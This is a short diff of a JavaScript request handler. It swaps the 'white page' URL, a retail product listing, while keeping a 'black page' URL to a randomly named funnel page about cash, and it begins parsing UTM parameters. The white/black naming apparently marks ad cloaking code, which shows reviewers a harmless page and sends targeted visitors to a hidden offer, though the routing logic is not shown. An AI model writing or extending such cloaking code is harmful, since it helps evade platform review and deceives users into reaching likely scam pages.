@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.athome.com/honeybloom-plush-performance-solid-blue-hand-towel-16x28/124344974.html";
+    const whitePageURL = "https://www.yoox.com/us/10033631QX/item#dept=men&queryID=4b6df3151848596f7bd65317deac3bd6&cod10=10033631QX&sizeId=-1";
     const blackPageURL = "https://VXAJXfDwZd.myfunnelish.com/cash-1735686017557538";
   
     // Parse the UTM parameters from the request URL
